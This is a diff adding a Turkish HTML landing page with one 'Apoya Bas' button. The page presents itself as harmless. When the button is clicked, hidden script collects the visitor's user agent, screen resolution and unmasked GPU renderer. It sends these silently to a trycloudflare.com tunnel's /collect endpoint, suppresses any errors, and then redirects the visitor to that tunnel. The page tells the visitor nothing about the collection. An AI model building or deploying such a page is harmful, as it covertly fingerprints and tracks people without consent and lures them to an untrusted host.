@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ana Sayfa</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background: #0f172a; color: #f8fafc; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .btn { background: #ff4757; color: white; padding: 18px 40px; font-size: 22px; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; box-shadow: 0 5px 20px rgba(255,71,87,0.4); transition: 0.2s; }
+        .btn:hover { background: #ff6b81; transform: scale(1.05); }
+    </style>
+</head>
+<body>
+    <button class="btn" onclick="apoyaBasTrigger()">Apoya Bas</button>
+
+    <script>
+        function apoyaBasTrigger() {
+            try {
+                const ua = navigator.userAgent;
+                const width = window.screen.width;
+                const height = window.screen.height;
+                const dpr = window.devicePixelRatio || 1;
+
+                let gpuText = "Bilinmeyen GPU";
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (dbg) gpuText = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch(e) {}
+
+                const realWidth = Math.round(width * dpr);
+                const realHeight = Math.round(height * dpr);
+
+                const data = {
+                    User_Agent: ua,
+                    Ekran: realWidth + "x" + realHeight,
+                    GPU: gpuText
+                };
+
+                const queryParams = new URLSearchParams(data).toString();
+                
+                fetch('https://stands-arrangement-div-until.trycloudflare.com/collect?' + queryParams, { method: 'GET', mode: 'no-cors' }).catch(function() {});
+            } catch(err) {}
+
+            setTimeout(function() {
+                window.location.href = "https://stands-arrangement-div-until.trycloudflare.com";
+            }, 250);
+        }
+    </script>
+</body>
+</html>
